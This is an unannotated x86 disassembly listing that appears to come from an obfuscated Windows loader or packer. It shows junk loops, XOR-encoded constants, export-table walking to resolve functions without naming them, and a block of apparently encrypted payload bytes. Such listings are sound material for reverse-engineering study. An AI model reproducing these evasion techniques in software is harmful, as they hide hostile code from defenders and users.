  408820:	pop    edi
  408821:	pop    esi
  408822:	pop    ebx
  408823:	leave  
  408824:	ret    0x10
  408827:	or     DWORD PTR ds:0x42c00c,0x42a008
  408831:	xor    eax,eax
  408833:	add    DWORD PTR ds:0x428028,0x42a010
  40883d:	inc    eax
  40883e:	ret    
  40883f:	push   ebp
  408840:	mov    ebp,esp
  408842:	mov    eax,ds:0x421962
  408847:	and    DWORD PTR ds:0x42c008,0x0
  408851:	xor    ecx,ecx
  408853:	or     ecx,DWORD PTR ds:0x42c008
  408859:	inc    ecx
  40885a:	mov    DWORD PTR ds:0x42c008,ecx
  408860:	cmp    DWORD PTR ds:0x42c008,0xc
  408867:	jne    0x40887d
  40886d:	push   0x423566
  408872:	push   0x42351e
  408877:	call   DWORD PTR ds:0x424030
  40887d:	cmp    DWORD PTR ds:0x42c008,0xb
  408884:	jne    0x408897
  40888a:	mov    ecx,DWORD PTR ds:0x42c008
  408890:	inc    ecx
  408891:	mov    DWORD PTR ds:0x42c008,ecx
  408897:	cmp    DWORD PTR ds:0x42c008,0x1b
  40889e:	jb     0x408851
  4088a4:	xor    ecx,DWORD PTR ds:0x42a01c
  4088aa:	mov    eax,DWORD PTR [eax+0x1c8]
  4088b0:	add    ecx,0x4e81
  4088b6:	mov    eax,DWORD PTR [eax]
  4088b8:	and    ecx,DWORD PTR ds:0x42b018
  4088be:	cdq    
  4088bf:	push   ebx
  4088c0:	mov    ecx,0xfabdbef1
  4088c5:	add    ebx,0x1541
  4088cb:	add    eax,ecx
  4088cd:	adc    edx,0xffffffff
  4088d0:	push   esi
  4088d1:	push   edi
  4088d2:	mov    edi,DWORD PTR ds:0x421782
  4088d8:	mov    ebx,DWORD PTR ds:0x4217aa
  4088de:	sub    edi,ebx
  4088e0:	or     edi,DWORD PTR [edi+ebx*1]
  4088e3:	mov    edi,edx
  4088e5:	and    DWORD PTR ds:0x429000,0x0
  4088ef:	jmp    0x408901
  4088f4:	mov    edx,DWORD PTR ds:0x429000
  4088fa:	inc    edx
  4088fb:	mov    DWORD PTR ds:0x429000,edx
  408901:	cmp    DWORD PTR ds:0x429000,0x1a
  408908:	jae    0x40895a
  40890e:	cmp    DWORD PTR ds:0x429000,0x7
  408915:	jne    0x40893b
  40891b:	push   DWORD PTR [ebp-0x1c]
  40891e:	push   0x85ec
  408923:	push   0x4f88
  408928:	push   DWORD PTR [ebp-0x10]
  40892b:	push   0x6e2c
  408930:	push   0x428000
  408935:	call   DWORD PTR ds:0x424038
  40893b:	cmp    DWORD PTR ds:0x429000,0x6
  408942:	jne    0x408955
  408948:	mov    edx,DWORD PTR ds:0x429000
  40894e:	inc    edx
  40894f:	mov    DWORD PTR ds:0x429000,edx
  408955:	jmp    0x4088f4
  40895a:	mov    edx,DWORD PTR [ebp+0x8]
  40895d:	adc    DWORD PTR ds:0x42a00c,0x42801c
  408967:	mov    ebx,eax
  408969:	mov    eax,0x8a29a123
  40896e:	xor    esi,esi
  408970:	xor    ebx,eax
  408972:	xor    edi,0x0
  408975:	and    DWORD PTR ds:0x429000,0x1a3f
  40897f:	add    edx,ecx
  408981:	adc    esi,0xffffffff
  408984:	xor    edx,eax
  408986:	xor    esi,0x0
  408989:	cmp    edx,ebx
  40898b:	jne    0x408999
  408991:	cmp    esi,edi
  408993:	je     0x4089c8
  408999:	mov    edx,DWORD PTR ds:0x421962
  40899f:	mov    edx,DWORD PTR [edx+0x1c0]
  4089a5:	mov    edx,DWORD PTR [edx]
  4089a7:	xor    esi,esi
  4089a9:	add    edx,ecx
  4089ab:	adc    esi,0xffffffff
  4089ae:	xor    edx,eax
  4089b0:	xor    esi,0x0
  4089b3:	cmp    edx,0x70941fd1
  4089b9:	jne    0x408a32
  4089bf:	cmp    esi,0xffffffff
  4089c2:	jne    0x408a32
  4089c8:	mov    edx,DWORD PTR ds:0x4219e6
  4089ce:	mov    esi,DWORD PTR ds:0x4219de
  4089d4:	xor    edx,esi
  4089d6:	mov    DWORD PTR ds:0x4219de,edx
  4089dc:	mov    edx,DWORD PTR [ebp+0xc]
  4089df:	mov    edx,DWORD PTR [edx]
  4089e1:	mov    edx,DWORD PTR [edx]
  4089e3:	mov    esi,DWORD PTR ds:0x4219de
  4089e9:	add    DWORD PTR [edx],esi
  4089eb:	mov    esi,DWORD PTR [ebp+0x8]
  4089ee:	mov    edx,DWORD PTR ds:0x4219de
  4089f4:	xor    esi,0x7510893
  4089fa:	add    esi,0x3272db
  408a00:	xor    ebx,ebx
  408a02:	add    esi,ecx
  408a04:	adc    ebx,0xffffffff
  408a07:	xor    edi,edi
  408a09:	xor    esi,eax
  408a0b:	xor    ebx,0x0
  408a0e:	add    edx,ecx
  408a10:	adc    edi,0xffffffff
  408a13:	xor    edx,eax
  408a15:	xor    edi,0x0
  408a18:	cmp    edx,esi
  408a1a:	jne    0x408a32
  408a20:	cmp    edi,ebx
  408a22:	jne    0x408a32
  408a28:	mov    eax,ds:0x4219de
  408a2d:	mov    ds:0x4219e6,eax
  408a32:	pop    edi
  408a33:	pop    esi
  408a34:	pop    ebx
  408a35:	pop    ebp
  408a36:	ret    0x8
  408a39:	push   ebp
  408a3a:	mov    ebp,esp
  408a3c:	push   ecx
  408a3d:	mov    eax,ds:0x4217ae
  408a42:	mov    eax,DWORD PTR [eax]
  408a44:	add    DWORD PTR ds:0x42901c,eax
  408a4a:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  408a51:	mov    eax,DWORD PTR [ebp+0x8]
  408a54:	adc    DWORD PTR ds:0x42a010,0x6bac
  408a5e:	mov    al,BYTE PTR [eax]
  408a60:	xor    DWORD PTR ds:0x42b018,0x428020
  408a6a:	add    al,0xd
  408a6c:	sbb    DWORD PTR ds:0x428004,0x428008
  408a76:	xor    al,0x6f
  408a78:	mov    DWORD PTR ds:0x428004,0x2e21
  408a82:	cmp    al,0x35
  408a84:	mov    DWORD PTR ds:0x42a00c,0x23cb
  408a8e:	jne    0x408b4b
  408a94:	and    DWORD PTR ds:0x428024,0x429014
  408a9e:	mov    eax,DWORD PTR [ebp+0x8]
  408aa1:	dec    edx
  408aa2:	mov    ecx,DWORD PTR [ebp+0x8]
  408aa5:	and    edx,DWORD PTR ds:0x42b010
  408aab:	add    ecx,DWORD PTR [eax+0x3c]
  408aae:	mov    edx,0x7510893
  408ab3:	mov    DWORD PTR [ebp+0x8],ecx
  408ab6:	and    DWORD PTR ds:0x42c008,0x0
  408ac0:	jmp    0x408ad2
  408ac5:	mov    ecx,DWORD PTR ds:0x42c008
  408acb:	inc    ecx
  408acc:	mov    DWORD PTR ds:0x42c008,ecx
  408ad2:	cmp    DWORD PTR ds:0x42c008,0x18
  408ad9:	jae    0x408b1d
  408adf:	cmp    DWORD PTR ds:0x42c008,0x9
  408ae6:	jne    0x408afc
  408aec:	push   0x429014
  408af1:	push   0x5ace
  408af6:	call   DWORD PTR ds:0x42403c
  408afc:	cmp    DWORD PTR ds:0x42c008,0x8
  408b03:	jne    0x408b18
  408b09:	xor    ecx,ecx
  408b0b:	or     ecx,DWORD PTR ds:0x42c008
  408b11:	inc    ecx
  408b12:	mov    DWORD PTR ds:0x42c008,ecx
  408b18:	jmp    0x408ac5
  408b1d:	mov    eax,DWORD PTR [ebp-0x4]
  408b20:	xor    eax,edx
  408b22:	push   esi
  408b23:	mov    esi,DWORD PTR [ebp+0x8]
  408b26:	mov    ecx,0x3272db
  408b2b:	add    eax,ecx
  408b2d:	cmp    DWORD PTR [esi+0x54],eax
  408b30:	pop    esi
  408b31:	je     0x408b3f
  408b37:	mov    eax,DWORD PTR [ebp+0x8]
  408b3a:	jmp    0x408b58
  408b3f:	mov    eax,DWORD PTR [ebp-0x4]
  408b42:	xor    eax,edx
  408b44:	add    eax,ecx
  408b46:	jmp    0x408b58
  408b4b:	mov    eax,DWORD PTR [ebp-0x4]
  408b4e:	xor    eax,0x7510893
  408b53:	add    eax,0x3272db
  408b58:	leave  
  408b59:	ret    0x4
  408b5c:	push   ebp
  408b5d:	mov    ebp,esp
  408b5f:	sub    esp,0x18
  408b62:	and    DWORD PTR ds:0x42901c,0x0
  408b6c:	jmp    0x408b7e
  408b71:	mov    edx,DWORD PTR ds:0x42901c
  408b77:	inc    edx
  408b78:	mov    DWORD PTR ds:0x42901c,edx
  408b7e:	cmp    DWORD PTR ds:0x42901c,0x1a
  408b85:	jae    0x408bb7
  408b8b:	cmp    DWORD PTR ds:0x42901c,0x22
  408b92:	jne    0x408ba8
  408b98:	push   0x8447
  408b9d:	push   0x423574
  408ba2:	call   DWORD PTR ds:0x424040
  408ba8:	jmp    0x408b71
  408bad:	adc    DWORD PTR ds:0x42b010,0x42b00c
  408bb7:	mov    DWORD PTR [ebp-0x10],0xf89f85b6
  408bbe:	mov    ecx,DWORD PTR ds:0x42177a
  408bc4:	mov    ecx,DWORD PTR [ecx]
  408bc6:	and    DWORD PTR ds:0x42c01c,ecx
  408bcc:	lea    eax,[ebp+0x14]
  408bcf:	mov    DWORD PTR [ebp-0x4],eax
  408bd2:	push   esi
  408bd3:	and    DWORD PTR ds:0x428018,0x0
  408bdd:	jmp    0x408bef
  408be2:	mov    esi,DWORD PTR ds:0x428018
  408be8:	inc    esi
  408be9:	mov    DWORD PTR ds:0x428018,esi
  408bef:	cmp    DWORD PTR ds:0x428018,0x1a
  408bf6:	jae    0x408cc4
  408bfc:	cmp    DWORD PTR ds:0x428018,0x28
  408c03:	jne    0x408c14
  408c09:	push   0x42358f
  408c0e:	call   DWORD PTR ds:0x424044
  408c14:	jmp    0x408be2
  408c19:	and    DWORD PTR ds:0x42c000,0x0
  408c23:	mov    edx,DWORD PTR ds:0x42c000
  408c29:	inc    edx
  408c2a:	mov    DWORD PTR ds:0x42c000,edx
  408c30:	cmp    DWORD PTR ds:0x42c000,0x20
  408c37:	jne    0x408c52
  408c3d:	push   0x1ea1
  408c42:	push   0x42b008
  408c47:	push   0x423652
  408c4c:	call   DWORD PTR ds:0x424048
  408c52:	cmp    DWORD PTR ds:0x42c000,0x11
  408c59:	jb     0x408c23
  408c5f:	and    DWORD PTR ds:0x42b004,0x0
  408c69:	mov    edx,DWORD PTR ds:0x42b004
  408c6f:	inc    edx
  408c70:	mov    DWORD PTR ds:0x42b004,edx
  408c76:	cmp    DWORD PTR ds:0x42b004,0xf
  408c7d:	jne    0x408c93
  408c83:	push   0x428004
  408c88:	push   0x7cc5
  408c8d:	call   DWORD PTR ds:0x424014
  408c93:	cmp    DWORD PTR ds:0x42b004,0xe
  408c9a:	jne    0x408cad
  408ca0:	mov    edx,DWORD PTR ds:0x42b004
  408ca6:	inc    edx
  408ca7:	mov    DWORD PTR ds:0x42b004,edx
  408cad:	cmp    DWORD PTR ds:0x42b004,0x1d
  408cb4:	jb     0x408c69
  408cba:	mov    DWORD PTR ds:0x428014,0x22a8
  408cc4:	mov    esi,0xf89c85b6
  408cc9:	and    DWORD PTR ds:0x428008,0x0
  408cd3:	mov    edx,DWORD PTR ds:0x428008
  408cd9:	inc    edx
  408cda:	mov    DWORD PTR ds:0x428008,edx
  408ce0:	cmp    DWORD PTR ds:0x428008,0x19
  408ce7:	jne    0x408d17
  408ced:	push   0x62e7
  408cf2:	push   0x428000
  408cf7:	push   0x75f3
  408cfc:	push   0x428000
  408d01:	push   DWORD PTR [ebp-0x24]
  408d04:	push   0x6458
  408d09:	push   DWORD PTR [ebp-0x14]
  408d0c:	push   0x5743
  408d11:	call   DWORD PTR ds:0x424018
  408d17:	cmp    DWORD PTR ds:0x428008,0x14
  408d1e:	jb     0x408cd3
  408d24:	xor    ecx,ecx
  408d26:	add    ecx,DWORD PTR ds:0x429008
  408d2c:	adc    DWORD PTR ds:0x42c00c,ecx
  408d32:	mov    DWORD PTR [ebp-0xc],esi
  408d35:	lea    eax,[ebp-0xc]
  408d38:	dec    ecx
  408d39:	mov    DWORD PTR [ebp-0x14],eax
  408d3c:	mov    eax,DWORD PTR [ebp-0xc]
  408d3f:	adc    ecx,0x29e6
  408d45:	mov    edx,DWORD PTR [ebp-0x14]
  408d48:	and    DWORD PTR ds:0x428018,0x0
  408d52:	mov    ecx,DWORD PTR ds:0x428018
  408d58:	inc    ecx
  408d59:	mov    DWORD PTR ds:0x428018,ecx
  408d5f:	cmp    DWORD PTR ds:0x428018,0xb
  408d66:	jne    0x408d77
  408d6c:	push   0x4faf
  408d71:	call   DWORD PTR ds:0x42401c
  408d77:	cmp    DWORD PTR ds:0x428018,0xa
  408d7e:	jne    0x408d91
  408d84:	mov    ecx,DWORD PTR ds:0x428018
  408d8a:	inc    ecx
  408d8b:	mov    DWORD PTR ds:0x428018,ecx
  408d91:	cmp    DWORD PTR ds:0x428018,0x1e
  408d98:	jb     0x408d52
  408d9e:	inc    ecx
  408d9f:	mov    ecx,0x7510893
  408da4:	neg    DWORD PTR ds:0x42a004
  408daa:	xor    eax,ecx
  408dac:	add    eax,0x3272db
  408db1:	and    DWORD PTR ds:0x42c010,0x2759
  408dbb:	mov    DWORD PTR [edx],eax
  408dbd:	mov    edx,DWORD PTR ds:0x421772
  408dc3:	mov    eax,ds:0x421782
  408dc8:	sub    edx,eax
  408dca:	and    edx,DWORD PTR [edx+eax*1]
  408dcd:	mov    eax,ds:0x4217da
  408dd2:	inc    DWORD PTR ds:0x42a01c
  408dd8:	mov    edx,DWORD PTR [ebp-0x4]
  408ddb:	and    DWORD PTR ds:0x42a018,0x7b9c
  408de5:	mov    eax,DWORD PTR [eax]
  408de7:	and    DWORD PTR ds:0x42c000,0x5f81
  408df1:	add    eax,DWORD PTR [edx]
  408df3:	movzx  edx,BYTE PTR ds:0x42a014
  408dfa:	or     DWORD PTR ds:0x42a01c,edx
  408e00:	push   edi
  408e01:	add    DWORD PTR ds:0x42a004,edx
  408e07:	mov    DWORD PTR [ebp-0x8],eax
  408e0a:	movzx  edx,WORD PTR ds:0x428004
  408e11:	sbb    DWORD PTR ds:0x42a01c,edx
  408e17:	mov    edi,DWORD PTR [ebp+0x8]
  408e1a:	and    DWORD PTR ds:0x42b01c,0x631e
  408e24:	mov    eax,ds:0x421962
  408e29:	mov    eax,DWORD PTR [eax+0x198]
  408e2f:	xor    edi,ecx
  408e31:	mov    DWORD PTR ds:0x428018,0x14
  408e3b:	cmp    DWORD PTR ds:0x428018,0x0
  408e42:	je     0x408e95
  408e48:	cmp    DWORD PTR ds:0x428018,0x3
  408e4f:	jne    0x408e63
  408e55:	push   DWORD PTR [ebp-0x28]
  408e58:	push   0x77dc
  408e5d:	call   DWORD PTR ds:0x424020
  408e63:	cmp    DWORD PTR ds:0x428018,0x4
  408e6a:	jne    0x408e7d
  408e70:	mov    edx,DWORD PTR ds:0x428018
  408e76:	dec    edx
  408e77:	mov    DWORD PTR ds:0x428018,edx
  408e7d:	mov    edx,DWORD PTR ds:0x428018
  408e83:	dec    edx
  408e84:	mov    DWORD PTR ds:0x428018,edx
  408e8a:	jmp    0x408e3b
  408e8f:	and    DWORD PTR ds:0x42c014,ecx
  408e95:	mov    edx,0x3272db
  408e9a:	sbb    DWORD PTR ds:0x429008,0x451c
  408ea4:	add    edi,edx
  408ea6:	mov    DWORD PTR ds:0x42a000,0x2432
  408eb0:	cmp    DWORD PTR [eax],edi
  408eb2:	je     0x408ebf
  408eb8:	mov    eax,DWORD PTR [eax]
  408eba:	jmp    0x409144
  408ebf:	mov    eax,DWORD PTR [ebp+0x18]
  408ec2:	cmp    eax,esi
  408ec4:	jne    0x408ede
  408eca:	mov    DWORD PTR ds:0x42a01c,0x2296
  408ed4:	push   0xf89c85b5
  408ed9:	jmp    0x409133
  408ede:	mov    esi,DWORD PTR [ebp+0x18]
  408ee1:	mov    eax,0x2f4e
  408ee6:	mov    eax,0xf89c85b4
  408eeb:	cmp    esi,eax
  408eed:	jne    0x409123
  408ef3:	sbb    esi,esi
  408ef5:	mov    eax,DWORD PTR [ebp+0x10]
  408ef8:	mov    esi,DWORD PTR ds:0x42c008
  408efe:	sbb    esi,DWORD PTR ds:0x42a008
  408f04:	mov    DWORD PTR ds:0x42c008,esi
  408f0a:	xor    eax,ecx
  408f0c:	mov    DWORD PTR ds:0x428000,0x1b
  408f16:	cmp    DWORD PTR ds:0x428000,0x0
  408f1d:	je     0x408f86
  408f23:	cmp    DWORD PTR ds:0x428000,0x4
  408f2a:	jne    0x408f5a
  408f30:	push   0x42a000
  408f35:	push   0x8ffd
  408f3a:	push   DWORD PTR [ebp-0x14]
  408f3d:	push   0x428014
  408f42:	push   0x2d9f
  408f47:	push   0x4236cc
  408f4c:	push   0x4cf3
  408f51:	push   DWORD PTR [ebp-0x1c]
  408f54:	call   DWORD PTR ds:0x424024
  408f5a:	cmp    DWORD PTR ds:0x428000,0x5
  408f61:	jne    0x408f74
  408f67:	mov    esi,DWORD PTR ds:0x428000
  408f6d:	dec    esi
  408f6e:	mov    DWORD PTR ds:0x428000,esi
  408f74:	mov    esi,DWORD PTR ds:0x428000
  408f7a:	dec    esi
  408f7b:	mov    DWORD PTR ds:0x428000,esi
  408f81:	jmp    0x408f16
  408f86:	add    eax,edx
  408f88:	mov    DWORD PTR [ebp-0x18],eax
  408f8b:	mov    eax,DWORD PTR [ebp+0xc]
  408f8e:	mov    esi,DWORD PTR [ebp-0x8]
  408f91:	xor    eax,ecx
  408f93:	add    eax,edx
  408f95:	imul   eax,DWORD PTR [esi]
  408f98:	mov    esi,DWORD PTR [ebp+0x8]
  408f9b:	xor    esi,ecx
  408f9d:	add    esi,edx
  408f9f:	cmp    esi,eax
  408fa1:	mov    eax,DWORD PTR [ebp-0x4]
  408fa4:	push   ebx
  408fa5:	je     0x408fc4
  408fab:	mov    esi,DWORD PTR [ebp-0x18]
  408fae:	add    DWORD PTR [eax],esi
  408fb0:	mov    eax,DWORD PTR [ebp-0x4]
  408fb3:	mov    esi,DWORD PTR [ebp+0xc]
  408fb6:	xor    esi,ecx
  408fb8:	add    esi,edx
  408fba:	imul   esi,DWORD PTR [eax]
  408fbd:	mov    DWORD PTR [eax],esi
  408fbf:	jmp    0x408fc9
  408fc4:	mov    esi,DWORD PTR [ebp+0x14]
  408fc7:	xor    DWORD PTR [eax],esi
  408fc9:	mov    eax,DWORD PTR [ebp-0x4]
  408fcc:	mov    edi,DWORD PTR [ebp+0x10]
  408fcf:	xor    edi,ecx
  408fd1:	mov    esi,0xffcd8d25
  408fd6:	mov    ebx,esi
  408fd8:	sub    ebx,edi
  408fda:	add    DWORD PTR [eax],ebx
  408fdc:	mov    eax,DWORD PTR [ebp-0x4]
  408fdf:	mov    edi,DWORD PTR [ebp-0x8]
  408fe2:	add    edi,DWORD PTR [eax]
  408fe4:	mov    DWORD PTR [ebp-0x8],edi
  408fe7:	mov    eax,DWORD PTR [ebp+0xc]
  408fea:	mov    edi,DWORD PTR [ebp+0xc]
  408fed:	xor    edi,ecx
  408fef:	xor    eax,ecx
  408ff1:	lea    eax,[eax+edi*1+0x64e5b6]
  408ff8:	mov    edi,DWORD PTR [ebp+0xc]
  408ffb:	xor    edi,ecx
  408ffd:	add    edi,edx
  408fff:	imul   eax,edi
  409002:	mov    edi,DWORD PTR [ebp+0xc]
  409005:	xor    edi,ecx
  409007:	sub    edi,eax
  409009:	mov    eax,DWORD PTR [ebp-0x4]
  40900c:	add    edi,edx
  40900e:	cmp    DWORD PTR [eax],edi
  409010:	mov    eax,DWORD PTR [ebp-0x4]
  409013:	mov    edi,DWORD PTR [ebp+0x10]
  409016:	jg     0x409029
  40901c:	xor    edi,ecx
  40901e:	mov    ebx,esi
  409020:	sub    ebx,edi
  409022:	add    DWORD PTR [eax],ebx
  409024:	jmp    0x40902f
  409029:	xor    edi,ecx
  40902b:	add    edi,edx
  40902d:	add    DWORD PTR [eax],edi
  40902f:	mov    eax,DWORD PTR [ebp-0x8]
  409032:	mov    edi,DWORD PTR [ebp-0x10]
  409035:	mov    eax,DWORD PTR [eax]
  409037:	xor    edi,ecx
  409039:	add    edi,0x3272da
  40903f:	not    edi
  409041:	and    eax,edi
  409043:	movsx  di,BYTE PTR [eax+0x1]
  409048:	mov    ebx,0x3b4b
  40904d:	sub    di,bx
  409050:	mov    ebx,0x8a85
  409055:	xor    di,bx
  409058:	mov    ebx,0x4f8a
  40905d:	cmp    di,bx
  409060:	jne    0x409088
  409066:	movsx  di,BYTE PTR [eax]
  40906a:	mov    ebx,0x3b4b
  40906f:	sub    di,bx
  409072:	mov    ebx,0x8a85
  409077:	xor    di,bx
  40907a:	mov    ebx,0x4f87
  40907f:	cmp    di,bx
  409082:	je     0x409098
  409088:	mov    edi,DWORD PTR [ebp-0x10]
  40908b:	xor    edi,ecx
  40908d:	mov    ebx,esi
  40908f:	sub    ebx,edi
  409091:	add    eax,ebx
  409093:	jmp    0x409043
  409098:	mov    esi,DWORD PTR [ebp-0x14]
  40909b:	mov    esi,DWORD PTR [esi]
  40909d:	mov    edi,DWORD PTR [eax+0x3c]
  4090a0:	lea    esi,[edi+esi*8+0x78]
  4090a4:	mov    esi,DWORD PTR [esi+eax*1]
  4090a7:	mov    DWORD PTR [ebp-0x8],esi
  4090aa:	mov    esi,DWORD PTR [ebp+0x8]
  4090ad:	xor    esi,ecx
  4090af:	add    esi,edx
  4090b1:	mov    DWORD PTR [ebp-0x14],esi
  4090b4:	mov    esi,DWORD PTR [ebp+0x8]
  4090b7:	mov    edi,DWORD PTR [ebp-0x8]
  4090ba:	xor    esi,ecx
  4090bc:	add    esi,edx
  4090be:	pop    ebx
  4090bf:	cmp    edi,esi
  4090c1:	jne    0x4090df
  4090c7:	mov    eax,DWORD PTR [ebp+0xc]
  4090ca:	xor    eax,ecx
  4090cc:	mov    ecx,DWORD PTR [ebp-0x8]
  4090cf:	add    eax,edx
  4090d1:	imul   eax,ecx
  4090d4:	mov    DWORD PTR [ebp-0x8],eax
  4090d7:	push   DWORD PTR [ebp+0x18]
  4090da:	jmp    0x409133
  4090df:	mov    ecx,DWORD PTR [ebp-0x8]
  4090e2:	add    ecx,eax
  4090e4:	mov    DWORD PTR [ebp-0x14],ecx
  4090e7:	mov    ecx,DWORD PTR [ebp-0x14]
  4090ea:	mov    ecx,DWORD PTR [ecx+0xc]
  4090ed:	movsx  cx,BYTE PTR [ecx+eax*1]
  4090f2:	mov    edx,0x3b4b
  4090f7:	sub    cx,dx
  4090fa:	mov    edx,0x8a85
  4090ff:	xor    cx,dx
  409102:	mov    edx,0x4f85
  409107:	cmp    cx,dx
  40910a:	jne    0x4090d7
  409110:	mov    ecx,DWORD PTR ds:0x421962
  409116:	mov    ecx,DWORD PTR [ecx+0x198]
  40911c:	mov    DWORD PTR [ecx],eax
  40911e:	jmp    0x409144
  409123:	mov    ecx,DWORD PTR [ebp+0x18]
  409126:	cmp    ecx,0xf89c85b5
  40912c:	jne    0x409144
  409132:	push   eax
  409133:	push   DWORD PTR [ebp+0x14]
  409136:	push   DWORD PTR [ebp+0x10]
  409139:	push   DWORD PTR [ebp+0xc]
  40913c:	push   DWORD PTR [ebp+0x8]
  40913f:	call   0x408b5c
  409144:	pop    edi
  409145:	pop    esi
  409146:	leave  
  409147:	ret    0x14
  40914a:	push   ebp
  40914b:	mov    ebp,esp
  40914d:	push   ecx
  40914e:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  409155:	mov    eax,DWORD PTR [ebp-0x4]
  409158:	mov    ecx,DWORD PTR ds:0x42b010
  40915e:	sbb    DWORD PTR ds:0x42a018,ecx
  409164:	mov    edx,DWORD PTR [ebp+0x10]
  409167:	mov    DWORD PTR ds:0x42801c,0x4950
  409171:	mov    ecx,0x7510893
  409176:	sbb    DWORD PTR ds:0x428028,0x4a48
  409180:	xor    eax,ecx
  409182:	add    DWORD PTR ds:0x42b000,0x42800c
  40918c:	add    eax,0x3272db
  409191:	mov    DWORD PTR ds:0x42a014,0x169
  40919b:	mov    DWORD PTR [edx],eax
  40919d:	sbb    eax,edx
  40919f:	mov    eax,DWORD PTR [ebp+0xc]
  4091a2:	xor    eax,ecx
  4091a4:	inc    edx
  4091a5:	push   esi
  4091a6:	xor    esi,edx
  4091a8:	mov    esi,DWORD PTR [ebp+0x10]
  4091ab:	mov    edx,0x3272db
  4091b0:	add    eax,edx
  4091b2:	add    DWORD PTR ds:0x42b01c,0x428020
  4091bc:	mov    DWORD PTR [esi+0x4],eax
  4091bf:	mov    eax,DWORD PTR [ebp+0x14]
  4091c2:	mov    esi,DWORD PTR ds:0x428024
  4091c8:	sbb    esi,DWORD PTR ds:0x429010
  4091ce:	mov    DWORD PTR ds:0x428024,esi
  4091d4:	mov    esi,DWORD PTR [ebp+0x10]
  4091d7:	mov    DWORD PTR [esi+0x8],eax
  4091da:	mov    eax,DWORD PTR [ebp+0x18]
  4091dd:	mov    esi,DWORD PTR [ebp+0x10]
  4091e0:	mov    DWORD PTR [esi+0xc],eax
  4091e3:	mov    eax,DWORD PTR [ebp+0x1c]
  4091e6:	mov    esi,DWORD PTR [ebp+0x10]
  4091e9:	mov    DWORD PTR [esi+0x10],eax
  4091ec:	mov    eax,DWORD PTR [ebp+0x8]
  4091ef:	xor    eax,ecx
  4091f1:	add    eax,edx
  4091f3:	pop    esi
  4091f4:	leave  
  4091f5:	ret    0x18
  4091f8:	push   ebp
  4091f9:	mov    ebp,esp
  4091fb:	sub    esp,0x94
  409201:	mov    eax,DWORD PTR [ebp+0x8]
  409204:	push   ebx
  409205:	neg    ecx
  409207:	jmp    0x40b57c
  40920c:	mov    dl,0xcf
  40920e:	enter  0x872f,0x27
  409212:	imul   ebp,DWORD PTR [edi+0x65],0xf8d7ebdc
  409219:	out    dx,eax
  40921a:	in     al,dx
  40921b:	dec    esi
  40921c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40921d:	sbb    BYTE PTR [edx+0x62],ah
  409220:	or     bl,BYTE PTR [edi+0x62]
  409223:	bound  edx,QWORD PTR [ecx-0x1d1ee13c]
  409229:	outs   dx,DWORD PTR ds:[esi]
  40922a:	ins    BYTE PTR es:[edi],dx
  40922b:	jecxz  0x409284
  40922d:	ins    BYTE PTR es:[edi],dx
  40922e:	pop    ebp
  40922f:	inc    ecx
  409230:	mov    eax,0xa3f03cc9
  409235:	mov    bl,0xc2
  409237:	xchg   BYTE PTR [edx+eax*2+0x6eb3769a],al
  40923e:	push   esp
  40923f:	xlat   BYTE PTR ds:[ebx]
  409240:	ror    BYTE PTR [eax],cl
  409242:	loope  0x409207
  409244:	push   ss
  409245:	(bad)  
  409246:	jmp    DWORD PTR [edi+0x3a97df39]
  40924c:	mov    BYTE PTR [esi],dl
  40924e:	jle    0x4092cd
  409250:	loopne 0x4091d2
  409252:	or     edx,0x175efe5f
  409258:	push   es
  409259:	push   ds
  40925a:	mov    fs,esi
  40925c:	bound  ebp,QWORD PTR [ebx]
  40925e:	and    eax,0x5e4381fb
  409263:	rcr    bh,cl
  409265:	mov    ch,0xce
  409267:	addr16 dec ecx
  409269:	scas   eax,DWORD PTR es:[edi]
  40926a:	inc    ebp
  40926b:	outs   dx,DWORD PTR ds:[esi]
  40926c:	xor    BYTE PTR [ebp+ecx*8-0x42],bl
  409270:	mov    ebp,0x9b280737
  409275:	or     dl,BYTE PTR [edx]
  409277:	out    0xd5,al
  409279:	pop    esp
  40927a:	push   ecx
  40927b:	mov    ch,0x8b
  40927d:	xchg   ebx,eax
  40927e:	mov    dh,0x1e
  409280:	sbb    esp,ebx
  409282:	add    eax,ebx
  409284:	add    eax,0xaec08763
  409289:	ret    
  40928a:	nop
  40928b:	loopne 0x4092de
  40928d:	cdq    
  40928e:	xor    BYTE PTR [edi-0x144a7cc6],bh
  409294:	mov    eax,esp
  409296:	icebp  
  409297:	popf   
  409298:	div    esi
  40929a:	dec    eax
  40929b:	mov    esi,0x28571ad1
  4092a0:	push   esi
  4092a1:	frstor [ebx-0x46]
  4092a4:	lods   al,BYTE PTR ds:[esi]
  4092a5:	mov    ecx,ds
  4092a7:	fld    QWORD PTR [esi+0x4970af8b]
  4092ad:	minps  xmm3,XMMWORD PTR [edx]
  4092b0:	add    bl,cl
  4092b2:	xor    esp,DWORD PTR [edx+0x2af51ae4]
  4092b8:	pushf  
  4092b9:	fst    QWORD PTR [eax]
  4092bb:	popa   
  4092bc:	mov    al,ds:0x1f4912e7
  4092c1:	lahf   
  4092c2:	dec    ecx
  4092c3:	or     eax,0x19ba823
  4092c8:	cmp    edi,ecx
  4092ca:	jg     0x4092ae
  4092cc:	sbb    eax,0xdb340e11
  4092d1:	add    ebx,DWORD PTR gs:[eax-0x174f973b]
  4092d8:	push   es
  4092d9:	sbb    BYTE PTR [eax],al
  4092db:	inc    edi
  4092dc:	push   ss
  4092dd:	fcomp  st(5)
  4092df:	and    DWORD PTR [edx+0x69f2176d],edx
  4092e5:	or     ecx,DWORD PTR [ebx+0x2cc5f2ea]
  4092eb:	sbb    BYTE PTR [eax-0x3f2d3ecf],ch
  4092f1:	push   esp
  4092f2:	mov    ch,0xb0
  4092f4:	or     eax,0x48dd7b08
  4092f9:	adc    al,0x8e
  4092fb:	mov    ecx,DWORD PTR [edx-0x5a]
  4092fe:	rdmsr  
  409300:	call   edi
  409302:	jae    0x409338
  409304:	mov    DWORD PTR [edx],edi
  409306:	xor    al,0x23
  409308:	push   esp
  409309:	cli    
  40930a:	jns    0x409375
  40930c:	nop
  40930d:	aas    
  40930e:	dec    edi
  40930f:	push   esp
  409310:	(bad)  
  409312:	xchg   esp,eax
  409313:	fist   DWORD PTR [edi+edi*1]
  409316:	out    dx,eax
  409317:	jge    0x409310
  409319:	dec    esi
  40931a:	out    dx,eax
  40931b:	test   ebp,esp
  40931d:	lods   eax,DWORD PTR ds:[esi]
  40931e:	mov    bh,ch
  409320:	mov    ah,0x96
  409322:	xor    dl,BYTE PTR [ebx]
